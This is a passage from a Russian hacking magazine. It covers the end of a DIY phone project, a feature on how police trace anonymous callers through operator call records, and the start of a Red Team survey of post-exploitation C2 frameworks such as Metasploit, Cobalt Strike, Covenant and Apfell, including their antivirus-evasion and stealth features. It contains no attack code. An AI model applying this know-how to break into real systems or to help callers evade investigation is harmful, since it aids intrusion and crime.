HEX. Также здесь можно перезаписать байты по произвольным адре сам,
вплоть до ручного управления полями в контактах (хотя конкретно для этого
удобнее воспользоваться подходящим раз делом).
  Меню call служит для быстрого набора номера из телефонной книги, тогда
как tel book позволяет редактировать и добавлять записи новых абонентов.
Power menu управляет нас тройками энергосбереже ния, а команды sleep
и sleep logo переводят устройство в режим сна (при мерно 6 и 9 мА потребле‐
ния соответственно).
   Есть и несколько допол нитель ных полезностей. Меню img выполняет фун‐
кции  галереи  и  предоставляет  дос туп   к  сохраненным  картинкам,
а sim800 напрямую взаимо действу ет с радиомодулем через стандартные
команды АТ. Как будто не самая очевидная вещь, но она мне здорово при‐
годилась при отладке.


ИДЕИ И РАЗВИТИЕ ПРОЕКТА
Я получил большое удовольствие от работы над своей мобилкой, пос ледова‐
тельно воплощая в жизнь раз ные функции, отлавливая ошибки и решая воз‐
никающие в процессе задачи. И само собой, оста навливаться на достигну‐
том я вовсе не намерен. Вот нес колько идей, которые я пока не реализовал,
но уже запланиро вал на ближайшее будущее: встро енные игры, шифрование
данных, отправ ка и прием MMS, записная книж ка, дополнительные поля
в контактах.
  И это далеко не пол ный список. Современные микроконтрол леры име ют
массу  полезных интерфейсов и  поз воляют подключать самую  разную
периферию: микросхемы внешней оперативной памяти, карточки SD, экраны
с высоким разрешением и даже цифровые камеры. Кажется, так можно
увлечься и собрать пол ноценный смартфон!
COVERSTORY

  CALL  CALL
 DETAIL  DETAIL
 RECORD RECORD


       КАК ПОЛИЦИЯ ВЫЧИСЛЯЕТ
           ПРЕСТУПНИКОВ
        БЕЗ СЛОЖНОЙ ТЕХНИКИ





Представь себе такую ситуацию: неизвес‐
тный  звонит  с  одноразо вого  телефона
и требует выкуп за похищен ного им челове‐
ка. На следующий день преступник звонит
еще раз. Жертва обращается в полицию,           Олег Афонин                                                                                      Эксперт по мобильной
и уже через полчаса там узна ют не только       криминалистике«Элкомсофт»компании
настоящий номер звонив шего, но и всю        aoleg@voicecallcentral.com
историю его перемещений и звонков. И все
это  без  сложной  тех ники,  поддельных
базовых станций и перехвата сигнала.


ВСЕВИДЯЩЕЕ ОКО
Мы регулярно пишем об уязвимос тях смартфонов, сетей передачи данных и о
безопасности облачных сервисов. Мы настолько привыкли «думать сложно»,
что совсем забываем о существовании гораз до более простых и эффектив‐
ных методов, доступных полиции разных стран.
  Зачастую полиция не будет даже пытаться что‐то взломать или перех‐
ватить, а просто сделает запрос к оператору сотовой свя зи, и последний
отдаст не только историю звонков, но и мас су другой инте ресней шей
информации. Как пример: статья об австралийском журналисте, в которой
проанализирована информация, собранная о самом журналисте его сотовым
оператором за последние два года (и только она).
  По австралийским законам операторы сотовой свя зи обязаны в течение
двух лет хранить определен ную информа цию о пользовате лях сети, базу Call
detail record. Сюда входит информация о мес тополо жении устройства в каж‐
дый момент времени (кстати, недавно в Швеции был создан пре цедент:
одной лишь этой информации недос таточно для вынесения приговора), жур‐
нал звонков, включая информа цию о другом абоненте, и данные о сессиях
выхода в интернет. Что каса ется SMS, то по авс тралийскому закону об охране
частной жизни без предваритель ной санкции на прослушивание опе ратор
имеет право (и обязан) сохранить лишь метаданные: время отправки, размер
сообщения и адресата. Содержимое самих сооб щений (а тем более голосо‐
вых звонков) не сохраняется.
   Так выглядит информация, соб ранная о журналис те оператором.





Места, которые посетил журналист 1 апреля 2015 года.





Места, которые он чаще всего посещал во время заданного временного
отрезка.





По ссылке доступны интерактивные версии этих данных.
  Метаданные включают информацию о том, кому звонил и писал сооб‐
щения пользователь, о длительнос ти звонков и о том, к каким базовым стан‐
циям в какой момент времени подключался телефон (такая информация поз‐
воляет достаточ но точно уста новить мес тоположение устройства). В некото‐
рых странах (не будем показывать пальцем, но это США) операторы не толь‐
ко выдают информацию о мес тополо жении пользователя полиции, но и с удо‐
вольствием приторговывают такими данными.
  Самое интересное, что операто рам сотовой свя зи доступны (и выдаются
полиции, а также продаются любому желающему) детали об использовании
интернета, включая адреса сайтов и объем переданных данных. Это —
совершенно отдельная тема для обсуждения; данные собирают, отслеживая
запросы к DNS‐серверам провайдера. Этими данными операторы также
с радостью приторговывают; кормушка нас только привлекательна, что опе‐
раторы даже пытались блокировать использование клиентами сторонних
DNS‐серверов.


             INFO

                     К  слову  говоря, выданные  (навязанные)  ста‐
                      ционарными интернет‐провайдерами устройства
                       (обычно   —   комбинированный   кабельный
                      или ADSL‐модем + роутер) зачастую не позволя‐
                     ют  сменить  DNS‐сервер  на  роуте ре.  Если
                      хочешь — меняй  на компьютере,  на каждом
                        отдельном телефоне, умном телевизоре и колон‐
                            ке, но защитить свою частную жизнь полностью,
                      просто задав настройки роуте ра, у пользователя
                      не выйдет.


Мобильные операторы в США также обязаны хранить записи CDR. Кроме
того, в Соединенных Штатах спецслужбами поддерживается еди ная база
MAINWAY, записи в которой могут храниться гораздо дольше, чем раз реша‐
ется по закону самим операторам мобильной свя зи.
  В России же принят так называемый за кон Яро вой, который обязывает
операторов сотовой связи в течение трех лет хра нить метаданные (их список
практически полностью совпадает с австралий ским вари антом закона). Кро‐
ме того, с октября прошлого года операторы обя заны хранить в течение
как минимум 30 суток (но не более шес ти месяцев) текстовые, голосовые,
видео‐ и другие сооб щения пользователей. Соответс твенно, в России любой
звонок должен быть записан оператором и предоставлен полиции по закон‐
ному требованию.


НЕ ТОЛЬКО CDR
В приведенном выше исследова нии журналист Уилл Окенден пользовался
iPhone. Правильно оформленный запрос в Apple (по терминологии ком‐
пании — Device Request, то есть такой запрос, в котором у полиции нет
ничего, кроме аппаратного идентификатора устройства — IMEI) поз волит
полиции получить и те данные, которые собира ет о пользовате ле Apple,
а туда входит почти все за редкими исключениями. Вот так, например, выг‐
лядит статистика запросов к Apple в Рос сии.





Для срав нения, в США за тот же год полиция запросила информацию
о 19 318 устройствах (успешными оказались 81% запросов). Google пред‐
лагает интерактивный график, ознакомиться с которым можно по ссылке.
  И если Apple не предос тавит полиции такие данные, как пароли поль‐
зователя, статистика использования устройства, сообщения SMS/iMessage
и данные «Здоровья» (история физичес кой активнос ти пользователя, включая
число шагов и частоту сердцебиения в заданном временном промежутке, —
полезнейшая вещь для ловли как преступников, так и неверных супругов), то
Google отдаст все, в том числе пароли (чтобы быть полностью техничес ки
корректным, добавлю, что в Android 9 появилось шифрование резервных
копий; соответственно, полиция не получит ни самих бэкапов, ни хранящихся
в них SMS и журналов звонков).


ОДНОРАЗОВЫЕ ТЕЛЕФОНЫ
Преступников, пользующихся своим основным телефоном для звонков
с угрозами, вымогательств и прочих уголовно наказуемых деяний, теперь
почти не водится; выше мы подробно разоб рались почему. Что остается
преступнику? Одноразовые SIM‐карты (пожалуй, не будем сейчас обсуждать
способы, которыми преступники обзаводятся такими картами) и одноразо‐
вые (как правило — дешевые кнопочные) устрой ства, желательно вовсе
лишенные возможности выхода в интернет.
  Для того чтобы получить хоть какие‐то данные о подозреваемом, полиции
нужна хотя бы одна зацепка — IMEI вполне достаточно. Но что можно опре‐
делить по идентификатору устройства, которое вклю чалось все го на нес коль‐
ко минут? Начитавшиеся конспирологических теорий (прекрасный пример)
начинающие преступники трепетно вынимают из телефона аккумулятор,
вклю чая устройство, лишь чтобы совершить звонок.
  Разумеется, никто из них даже не задумывается о том, что происходит,
когда устройство вклю чает ся и выключа ется (как штатно, так и аварийно,
с извлечением аккумулятора). Тем более мало кто задумы вается о том,
известно ли оперативным работникам полиции о таком шаблоне.
   Уверенный в своей безопас ности прес тупник уходит из дома (если не ухо‐
дит — с большой вероятностью его местоположение определят сразу же
или постфактум, проанализировав логи) и звонит с одноразового телефона.
Где при этом находится его основной телефон? Рассмотрим вари анты.


Кейс 1
Начнем с рассмотрения самой типичной ситуации: «подозрительный» звонок
совершается с одноразового, «анонимного» телефона, при этом собствен‐
ный телефон преступник взял с собой. Ничего невероятного в этом нет; дос‐
таточно почитать полицейские сводки, чтобы понять, что так действу ет боль‐
шинство.
  Полиция запрашивает у оператора сотовой свя зи записи CDR за указан‐
ный период. В зависимости от страны и действу ющих в ней законов оператор
возвращает либо сырые данные, либо анонимизированный список устройств
(каждый аппаратный идентифика тор заменяется на хеш‐функцию). Фактичес‐
ки полиция получает готовый список устройств, подключенных к соте, где
было зарегистрировано устройство, с которо го был совершен звонок. Пред‐
полагается, что среди этих устройств будет при сутствовать и собственный
телефон преступника.
  К одной и той же соте может быть одновременно подключено несколько
тысяч абонентов, поэто му единичный запрос мало что даст полиции. Однако
если преступник позвонит жертве еще раз — неваж но, из той же соты или из
другой (из другой даже лучше), — полиция получит допол нительные выборки.
Далее пересекаются множес тва устройств, которые были зарегистрированы
в той же соте на момент совершения звонка с «анонимного» устройства;
как правило, на второй‐треть ей выборке остается всего нес колько десятков,
а то и единичные идентифика торы.
  Разумеется, на практике все нес колько сложнее. Например, учитывается
не только подключение к конкретной вышке, с которой был сделан звонок,
но и данные с соседних вышек. Использование этих данных позволя ет (и поз‐
воляло, кстати, даже пятнадцать лет назад) про извести триангуляцию, опре‐
делив местоположение устройства с точностью от нескольких десятков
до нескольких сотен метров. Согласись, с такой выборкой работать заметно
приятнее.
  Впрочем, в больших городах с высокой плотностью населе ния (аноним‐
ные звонки часто совершают в людных мес тах) круг подозреваемых даже
в результате третьей выборки может оказать ся слишком широк. В таких слу‐
чаях (не всегда, но в особо важ ных делах) в игру вступает анализ «больших
данных». Подробно об этом мне уда лось узнать два года назад из всту питель‐
ной речи на полицейском конгрес се в Берлине. Аналитик исследует шаблоны
поведения устройств, обозначенных условны ми идентификаторами. Разговор
по телефону, активное потребление трафика, перемещения в пространс тве,
время регистрации в соте и целый ряд дополнитель ных параметров поз воля‐
ют исключить значитель ную часть устрой ств, тем самым заметно сократив
круг подозреваемых.
  Вывод: легче всего засечь прес тупника, у которого при себе есть пер‐
сональное устройство (личный смартфон) и который при этом перемещается.
Сделал анонимный звонок из одной соты — очерчено множество устройств.
Сделал второй звонок из дру гой соты — и список устройств, следующих тем
же маршрутом, сократился на порядок.
   Кстати, развенчаю популярный киношный шаблон. Для точного опре деле‐
ния местоположения телефона время его нахождения в сети не играет
ни малейшей роли: местополо жение определя ется моментально при регис‐
трации телефона в сети и сохраня ется в логах, откуда его можно легко
извлечь. Если устрой ство перемещается, то мес тоположение можно уста‐
новить еще точнее. Заодно пройдемся по конспирологам: выключенный
телефон не сооб щает о своем мес тополо жении, даже если не извлекать
из него батарейку (хорошо, iPhone 11 может сооб щать благодаря чипу U1,
да и то не сейчас, а когда‐нибудь в будущем, ког да Apple включит эту воз‐
можность в прошивке).
  Подытожим: преступник включил аппарат, совершил анонимный звонок
или отправил SMS, выключил устройство или извлек батарейку. На сле‐
дующий день снова включил, поз вонил из дру гой части города, выключил.
Список устройств, которые могут принадлежать преступнику, сократился
до нескольких штук. Третий звонок позволил окончательно идентифицировать
преступника, можно выез жать. Все это — без использования каких‐либо
спецсредств, простой анализ логов по трем вклю чениям.


Кейс 2
«Кто же ходит на дело с включенным телефоном?» — можешь логично поин‐
тересоваться ты. Действительно, предус мотрительный преступник может
выключить основной телефон перед тем, как совершить звонок с анонимного
устройства. Очень хорошо: теперь полиции достаточно посмотреть список
устройств, которые были отключены в момент совершения анонимного звон‐
ка. В таком случае хватит и одной итерации. Если же преступник еще и вклю‐
чит свой основной телефон после анонимного звонка, то за ним можно смело
отправлять опергруппу.
  Почему так? Дело в том, что при отключении телефон посылает соте сиг‐
нал, и это позволяет различить устройства, которые были отключены, от тех,
которые покинули соту. При включении, соответственно, создается новая
запись. Проследить такие активности — дело нескольких кликов.


Кейс 3
«Да кто вообще берет с собой на дело собственный телефон?» Как ни стран‐
но, берут и носят, причем далеко не только телефоны. Берут телефоны
или оставляют дома телефон, но берут умные часы; кстати, это позволило
полиции раскрыть массу прес туплений. Большинс тво «телефонных» прес‐
тупников — далеко не профес сионалы, и зна ния о том, как функционирует
сотовая  связь, какие данные собираются и  как анализируются,  у них
в зачаточном состоянии. Человечес кий фактор поз воляет полиции раскры‐
вать многие преступления прос тым сопос тавлением фактов.
   Если же преступник действительно ни разу не возьмет с собой телефон
(практика показывает, что обычно хоть раз, но оши баются все), то вычислить
его может помочь анализ больших данных. Многое здесь будет зависеть
от того, сколько времени готов потратить и нас колько серьезные уси лия
готов приложить зло умышленник для совершения анонимного звонка, а также
от того, сколько будет таких звонков.


Если ано нимных устройств мно го
А если преступник хитер и использует не один, а несколько анонимных
телефонов, избавляясь от улики каждый раз после звонка? Именно такая
практика часто показывается в фильмах. Прочитав предыдущие разделы, ты,
вероятно, уже сооб разил, что все, что выгадывает прес тупник при исполь‐
зовании нескольких разных устройств, — это несколько лишних секунд ано‐
нимности,  тех, что предшествуют собственно звонку. Пос кольку звонки
со всех анонимных устройств будут приобщены к делу, у полиции появляются
дополнительные зацепки: источник про исхождения «анонимных» SIM‐карт и,
возможно, место покупки одноразо вых телефонов. Совершался звонок
с одного и того же устройства или нескольких раз ных, не повлияет на ход рас‐
следования.


Те лефон ный терроризм: а если зво нок был действительно один?
А что, если звонок был действительно всего один? Для того чтобы сообщить
о минировании школы или аэро порта, вто рой звонок и не нужен: телефон‐
ному террористу достаточно сделать ровно один звонок, пос ле чего «зас‐
ветившееся» устрой ство мож но выбросить или уничтожить вместе с SIM‐кар‐
той.
   Как ни удивительно, и таких прес тупников часто ловят, используя опе‐
ративно‐разыскные мероприятия, отработанные еще во вре мена звонков
с уличных таксофонов. Если у преступника есть постоянный смартфон, то круг
подозреваемых можно резко огра ничить, проведя анализ по первому из опи‐
санных в статье методов. Таким образом, даже в городе‐миллионнике круг
подозреваемых сужается до нескольких сотен (редко — тысяч) абонентов.
Если речь идет о «миниро вании» школы, то мно жество «подозрительных»
абонентов пересекается со множеством учеников школы. С теми,  кто
остался, оперативнику будет достаточно прос то поговорить.
  Помогает в раскрытии телефонного терроризма и то, что такие прес тупни‐
ки, как правило, слабо представляют себе возможности и особенности
работы оперативников и ста раются защититься от придуманных, несуществу‐
ющих опасностей, совершенно игнорируя очевидное. Два года назад офис
наших коллег (по случайному совпадению — также раз работчиков ПО для
полиции) был эвакуирован по звонку от неизвес тного, сообщившего о взрыв‐
ном устройстве в здании. Не прошло и нес коль ких часов, как полиция уже
задержала преступника. Преступником ока залась сумасшедшая бабушка,
которая хотела насолить соседям, но перепутала адрес. Не помог ни спе‐
циально купленный мститель ной ста рушкой кно почный телефон, ни «аноним‐
ная» (а точнее — зарегистрированная на несуществу ющие ФИО) SIM‐карта.


А если зво нить через VoIP, используя VPN?
Если тебе в голову пришла мысль, что действительно анонимный звонок мож‐
но совершить через сервис VoIP (желательно бес платный, чтобы не све тить
платежные средства), да еще и через сервис VPN, который не хранит логи, —
поздравляю, ты мыслишь как самый настоящий бандит.
  Разумеется, всегда есть вероятность «про колоться», забыв проконтро‐
лировать соединение с сервером VPN или слу чайно войдя с собственными,
а не «анонимными» данными для звонков. Чтобы такого не произошло, прес‐
тупные группировки идут на серьезные траты, заказывая изготовление
модифицированных (на программном уровне) телефонов. Случай с арестом
CEO компании, произво дящей такие устрой ства на основе стареньких
телефонов BlackBerry, показал масштаб операций. Несмотря на то что эту
криминальную  сеть  полиции  уда лось  накрыть  (и  получить  контроль
над инфраструктурой зашифрованных коммуника ций, которой пользовались
преступники), в полиции понимают, что это лишь первый шаг. «Преступники
неизбежно мигрируют на дру гие сервисы, и мы представляем, какие именно.
Не буду показывать пальцем, но рано или поздно мы доберемся и до них»
(помощник комиссара AFP Гоган).


КАК ПРОИСХОДИТ АНАЛИЗ
В отчете, опубликованном ITU (Республика Гви нея), довольно подробно опи‐
саны как методы,  так и инстру менты, которыми пользуются аналитики.
В целом процесс можно изоб разить так.





И чуть более детально.





Все, что нужно полицейским, — это собственно «сырые» данные CDR и софт,
при помощи которого их можно загрузить и проанализировать («сырые» дан‐
ные малопригодны для ана лиза вручную, но отфиль трованные впол не можно
вывести на экран в текстовом виде или распечатать).
  О популярности это го способа расследования говорит тот факт, что
записи CDR поддерживает чуть ли не каждый серь езный криминалистический
пакет. Примеры:  Penlink, HAWK  Analytics, GeoTime, CSAS,  российский
«Мобильный криминалист» от Oxygen Software, Advanced Cell Tracking и мно‐
гие другие. Впрочем, нам приходилось общаться и с полицейскими, успешно
использующими в работе связ ку из Google Maps и Microsoft Excel.
   Без сомнения, на вооружении у спецслужб есть спецтехника, позволя‐
ющая подавить сотовую связь, подменить базовую станцию или под делать
координаты GPS. Вот только полиция не использует большую часть этой тех‐
ники — по крайней мере, в рас следовании рутинных преступлений телефон‐
ных террористов и вымога телей. Дорого, сует но, затратно по времени, да и
по большому счету не нужно, а иногда и неэффективно. Анализ логов CDR
(Call Detail Record) — гораздо более эффективное вложение времени и сил.
  Показателен случай, произошедший нес коль ко лет назад в Великоб‐
ритании. Полиция вела наблюдение за одним из боссов наркокартеля.
Задержать не проб лема, но доказательств нет, дело бы развалилось в суде.
По мнению полиции, в телефо не преступника (он пользовался iPhone) могли
содержаться жизненно необ ходимые улики, но взломать код блокировки дос‐
таточно свежей модели на тот момент не представлялось возможным.
В результате была разработана операция; за преступником велось наб‐
людение. Как только он взял телефон, разблокировал его и начал набирать
текст, наркобарона задержали, а телефон буквально вырвали из рук.
  Интересна здесь не предыстория, а такая нез начительная деталь: для того
чтобы довезти iPhone преступника до лабора тории в разблокированном сос‐
тоянии, был назначен специальный полицейский, вся работа которого сво‐
дилась к тому, чтобы периодически проводить пальцем по экрану, не поз‐
воляя устройству заснуть. (Не нуж но счи тать полицейских прос тофилями: все
в курсе, что есть настройка, контролирующая время, через которое экран
телефона выключается, а сам телефон бло кируется. А вот о том, что
на телефон легко, в пару кликов, можно установить профиль конфигурации,
который запрещает отключение автомати чес кой блокировки, знают уже
не все.) Телефон успешно довез ли до лабора тории, данные извлекли, нужные
улики получили.


КАК-ТО ЭТО ВСЕ… НЕНАДЕЖНО!
Если после прочтения этой статьи у тебя воз никло впе чатление, что осно‐
вывать приговор на данных, полученных от сотовых операторов, как‐то
не совсем правильно, поспешу согласиться. Более того, с тобой согласен
и Верховный суд Дании, ограничивший использование данных мес тополо‐
жения из записей CDR стороной обвинения. Запрет возник не на ровном
месте: из 10 700 обвинительных приговоров, основанных на этих данных (что
немало для спокой ной небольшой стра ны) уже 32 человека признаны
невиновными в результате дополнитель ных проверок. По словам директора
Ассоциации индустрии телекоммуникаций, «эта инфраструктура создавалась
для обеспечения услуг связи, а не для слежки за гражданами». «Попытка
истолковать эти данные приводит к ошиб кам», а «доказательства, которые
выглядят основанными на точных техничес ких измерениях, вовсе не обя‐
зательно обладают высокой ценностью в суде».
  На  большинстве  курсов повышения  ква лификации  для  работников
полиции обязательно говорят, что нельзя полностью доверять цифровым
уликам независимо от способа, которым те были получены. Рас сказывают
о делах, когда местополо жение подозрева емого опре деля лось на основе
метаданных из фотографий, которые были син хронизированы через облако,
а не сняты самим устройством.
  Показателен случай, когда ответ на входящий звонок был истолкован
как «отвлечение внимания при вождении», приведшее к аварийной ситуации.
На самом же деле кнопочный тогда еще телефон мирно лежал в кармане
у водителя, но из‐за случайно зажатой кнопки телефон «ответил» на звонок,
что и было зарегистрирова но оператором. Защита смогла оправдать водите‐
ля, допросив второго або нента, который и показал, что разговор не состоял‐
ся (кстати, что там было «на самом деле», неиз вестно, но суд встал на сто‐
рону обвиняемого).
   Уверен, такой случай далеко не единственный. Данные CDR — прек‐
расный инструмент в руках оперативника, но ненадежный в качестве доказа‐
тельной базы.


ЗАКЛЮЧЕНИЕ
Какие выводы можно сделать из этой статьи? Сей час, когда личный смартфон
или хотя бы кнопочный телефон есть практичес ки у каждого, любой человек
оставляет «цифровой след». След этот содержит заметно больше информа‐
ции, а добраться до него зна читель но проще, чем многие осознают.
Для получения всей интересующей информа ции полиции нужна лишь одна
зацепка, которой может стать аппаратный идентифика тор личного смартфона
преступника, даже если тот ни разу не вос пользовался личным устройством
в преступных целях. Получение такой зацепки — результат обычного, рутин‐
ного анализа логов операторов мобильной свя зи. Спецсредства не нужны,
конспирология не нужна, все происхо дит и гораз до проще, и интерес нее.
Вместо погонь и стрельбы — кабинетная работа с аналитической прог‐
раммой, простой базой данных или даже с рас печатками.
ВЗЛОМ

 ФРЕЙМВОРКИ
 ДЛЯ ПОСТЭКСПЛУАТАЦИИ





                                       Денис Шрамко
                                       Ведущий эксперт Центра
                                         киберзащиты (Red Team)
                                               Сбербанка


     ВЫБИРАЕМ МЕЖДУ METASPLOIT,
     COBALT STRIKE, MERLIN, APFELL,
     FACTION C2, KOADIC И ДРУГИМИ





В этой  статье мы поговорим о фреймворках, которые
помогут эксплуатировать уязвимости, закрепиться и прод‐
винуться в целевой инфраструктуре. Для этого рассмотрим
основные актуальные проекты, их функции и особен ности.
Надеюсь, ты найдешь для себя что‐нибудь новенькое или по
ходу чтения придумаешь, как сделать свой рабочий процесс
еще эффектив нее.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.


Эксплуатация представляет собой последователь ность дей ствий, которая
помогает атакующему получить доступ к исследуемой системе, используя
уязвимость или ошибку в нас тройках. А раз это последовательность дей‐
ствий, значит, ее можно и нужно автоматизировать.
   Если ты выступаешь на стороне Red Team, то тебе в работе прос то необ‐
ходимы инструменты, которые помогут автоматизиро вать выпол нение рутин‐
ных операций. При этом важ но обеспечить высокий уровень скрытности и к
тому же иметь возможность работать совмес тно с другими участниками Red
Team.
   Стоит учитывать, что большинство критичных сис тем в наше время пря чет‐
ся за системами обнаружения и предотвращения вторжений (IDS, IPS) и им
подобными ком плексами, а на рабочих станциях раз вернуты средс тва анти‐
вирусной защиты. В таких случаях нуж на более тща тельная разведка с при‐
менением в том числе социальной инженерии, чтобы иметь представление
о структуре и атакуемых ресурсах.
   Как известно, идеальных систем не быва ет — всегда най дется уязвимое
место, где можно закрепиться и продвинуться вглубь. Но если у тебя
одна‐единствен ная точка входа, то каждый твой шаг должен быть дос кональ‐
но продуман и каждое решение должно быть тща тельно взвешено.


ЧТО ТАКОЕ ПОСТЭКСПЛУАТАЦИЯ?
Итак, ты, вооружившись своим любимым Nmap или Masscan, с любопытством
рассматриваешь результаты рекона и  уже, наверное, потираешь  руки,
перебирая в голове первые пришедшие на ум экс плоиты, анализи руешь воз‐
можности и предвкушаешь будущие завоевания. :)
   Как понятно из самого термина, пос тэкс плуатация означает в основном
действия, которые следуют после того, как ата куемая инфраструктура была
скомпрометирована.  Ценность   взло манной   системы   опре деля ется
весомостью фактических данных, хра нящихся в ней, и тем, как ты можешь их
использовать в сво их целях.
   То есть постэксплуатация — это, по сути, то, как можно использовать
информацию о скомпро метированной цели. На данном этапе речь идет
о сборе конфиденциальной информа ции, ее документировании, а также
о настройках конфигурации, сетевых интерфей сах и других каналах связи.
  Для атакующего важно хорошо ориентироваться и представлять, где какие
данные хранятся, а также быс тро перемещаться внутри атакуемой сис темы,
обеспечивая мак симальную скрытность: исполь зовать прокси‐серверы, тун‐
нелированные соединения (pivot) и так далее.
  При большом скоупе сетевых ресурсов бывает сложно оперативно разоб‐
раться и понять, где какие уяз вимос ти найдены, какие логины и пароли к чему
относятся, какие сетевые зоны безопасности откуда дос тупны, где загружен
пейлоад и где можно повысить привилегии.
  В таких ситуациях и выруча ют фреймворки, которые объ еди няют в себе
нужную информацию и дают возможность быстро рулить процессом и прод‐
вигаться в атакуемой системе. В них же могут входить и более удобные инс‐
трументы постэксплуатации.


METASPLOIT FRAMEFORK
https://www.metasploit.com
   Начнем, конечно же, с Metasploit Framework компании Rapid 7. На момент
написания статьи доступна версия 5.0.48. У Metasploit сегод ня больше всего
модулей — есть средства почти на все случаи жиз ни. Также он работает
с локальной базой данных, которая может включать информацию по сканиро‐
ванию, обнаруженные учетные записи и про чее.
   Этот фреймворк с оболочкой Armitage может выступать и в роли сервера
C2 (Command and Control). В качес тве основной полезной нагрузки исполь‐
зуется Meterpreter — интерактивная оболочка, с помощью которой ата‐
кующий может исследовать целевую машину, выпол нять команды ОС,
инжектить полезную наг рузку в легитимные про цес сы и многое другое.
Для генерации полезной нагрузки служит инс трумент msfvenom.


             INFO

                 О генерации пейлоада и его кодировании читай
                        в  статье  «Энкодеры  msfvenom.  Разбира емся
                        с кодированием боевой нагрузки при бинарной
                        эксплуатации».


Metasploit полезен как в эксплуата ции уязвимос тей, так и в пос тэксплуатации.
Имеется возможность обхода средств антивирус ной защиты, систем предот‐
вращения вторжений (IPS) и других технологий безопас ности. В нем ты
можешь написать свой собственный модуль на одном из трех языков — Go,
Python или Ruby, а также запус тить RESTful‐сервис на базе PostgreSQL
для подключения нескольких консолей Metasploit или внешних инстру ментов.





Это самый популярный фреймворк, у него большое комьюнити, и о нем
написаны горы документации и полезных советов, поэтому мы спокойно идем
дальше.


COBALT STRIKE
https://www.cobaltstrike.com
  Последняя версия — 3.14 от мая 2019 года. Это отличный фреймворк
для эксплуатации и пос тэксплуата ции. В качес тве пейлоада используется
beacon, у которого есть воз можнос ти обфуска ции и фриза для обхода анти‐
вирусов. Поддерживает миграцию в процессы. Подходит в качестве сервера
C2 — особенно удоб но ориентировать ся при большом скоупе. Из коробки
имеет генератор полезных нагрузок в один клик, а также различные методы
доставки, что экономит немало времени.





Кредо Cobalt  Strike — это скрыт ность. Beacon большую часть времени
находится в состоянии фриза или сна, и на C2 отправляется только «сердце‐
биение» (Heartbeat), так что обнаружить его неп росто.
  Самый крупный недостаток «Кобальта» — он недоступен для рядовых
пользователей. Cobalt Strike — коммерчес кий продукт, и разработчики серь‐
езно относятся к распространению. Есть пробный период на 21 день, но в
таком режиме ты стол кнешь ся с существенными огра ничениями.
   Cobalt Strike генерирует собственные исполня емые файлы и библиотеки
DLL с помощью Artifact Kit. Они, в свою очередь, отправляют полезную наг‐
рузку, что помогает обойти некоторые антивирусы. Пробная версия включает
только шаблон Artifact Kit без возможности создавать исполняемые файлы.
   Также триальная версия «Кобальта» не загружает и не использует гиб кие
профили C2. Это функция, которая позволя ет пользователям изме нять
сетевые индикаторы в полезной нагрузке Beacon. Каждый HTTP‐запрос GET
пробной версии вклю чает заголовок X‐Malware со строкой EICAR в качестве
содержимого. Аналогично модули для атак на Java включают файл EICAR
внутри пакетов .jar.
  И наконец, из проб ной версии удален основной энкодер полезной наг‐
рузки Cobalt Strike. Все эти огра ничения сделаны для того, чтобы пробную
версию нельзя было использовать в зло намеренных целях.


             INFO

                   EICAR (или EICAR‐Test‐File — от European Insti‐
                            tute   for   Computer   Antivirus   Research)  —
                        это небольшой 68‐байтный COM‐файл, который
                      не явля ется вирусом, а всего лишь выводит тек‐
                        стовое сообщение и возвращает управление опе‐
                      рационной системе. Файл был создан как единый
                        стандарт проверки работы антивируса и пред‐
                         ставляет собой такой набор байтов:
                    X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR‐
                   STANDARD‐ANTIVIRUS‐TEST‐FILE!$H+H*



COVENANT
https://github.com/cobbr/Covenant
  Переходим к менее популярным, но все еще дос тойным внимания вари‐
антам. Covenant — это опенсорсный фреймворк для постэкс плуатации,
который работает на .NET Core. У Covenant есть поддержка Docker, что поз‐
воляет легко поднять контейнер с ним на любой системе. В состав фрей‐
мворка входят три компонента: Covenant — серверная часть, Elite — консоль‐
ный  клиент  (временно исклю чен для доработки  в пос леднем  релизе)
и Grunt — имплант. У это го фреймворка понятный и простой пользователь‐
ский веб‐интерфейс, дос тупны три пользователь ские роли.





         По умол чанию веб‐интерфейс работает на порте 7443

Основное предназначение — служить сервером C2 для Red Team. Генери‐
ровать полезную нагрузку можно прямо из веб‐интерфейса либо из консоль‐
ной части. Вот все доступные варианты.





На дашборде — активные сес сии, список задач для имплантов и список
listeners.





То есть при командной работе ата кующие видят, какая информация и отку да
уже получена, где какой тип имплантов активен и так далее. Результаты сох‐
ранены в виде тикетов с номерами, сохраняется также вывод команд.
   Страница редактирова ния профиля listener поз воляет изме нять любой
параметр, вклю чая заголовки запросов и ответов, обратные вызовы, а также
форматы запросов и ответов. Для удобс тва вос приятия есть граф, где отоб‐
ражаются связи вида «listener — родитель ский узел — дочерний узел».





Вся собранная информация с атакуемых ресурсов категорирована. У фрей‐
мворка есть интерактивная командная оболочка с подсветкой всех доступных
команд.





Covenant можно кастомизировать, создавая свои шаблоны. А также он
отлично подходит для решения задач постэксплу ата ции Windows.


APFELL
https://github.com/its‐a‐feature/Apfell
    Apfell — кросс‐платформенный фреймворк для постэксплу атации, пос тро‐
енный на базе Python 3 и Docker. Как и Covenant, он рассчитан в первую оче‐
редь на использование учас тниками Red Team в качес тве сервера C2.
  По сути, Apfell применяет веб‐контейнеры и контейнеры Docker для внут‐
ренней части, где сервер на Python обрабатывает большую часть веб‐зап‐
росов через RESTful API и WebSockets. Затем этот сервер обрабаты вает
соединения с базой данных PostgreSQL и связывается с дру гими контей‐
нерами Docker через RabbitMQ. Это поз воляет раз мещать отдельные ком‐
поненты на отдельных физичес ких компь юте рах или, при необ ходимости,
на разных виртуальных машинах.
  Фреймворк способен объединять работу нес кольких команд. В менед‐
жере операций можно посмотреть статус, настроить права и связи. Целью
разработчиков Apfell было соз дание простого окру жения, где агенты настра‐
иваются по принципу plug‐and‐play.





Процесс сборки предельно быстрый и незамысловатый благодаря под дер‐
жке Docker. База данных содержит всю основную информацию для ата‐
кующих: найденные учет ные записи, пейлоады, таски, рес понсы, файлы
и скрины. Apfell позволяет использовать в рабочем процессе классификацию
MITRE ATT&CK. А еще каж дую активность можно комменти ровать, что помога‐
ет работать в едином информа ционном прос транстве с коллегами. Генера‐
ция полезных нагрузок происходит в веб‐интерфейсе, есть консоль управле‐
ния агентами.





Apfell — достойный фреймворк, но только для выполнения задач Red Team.
Для других задач он вряд ли подойдет из‐за своей узкой направленности.


FACTION C2
https://www.factionc2.com
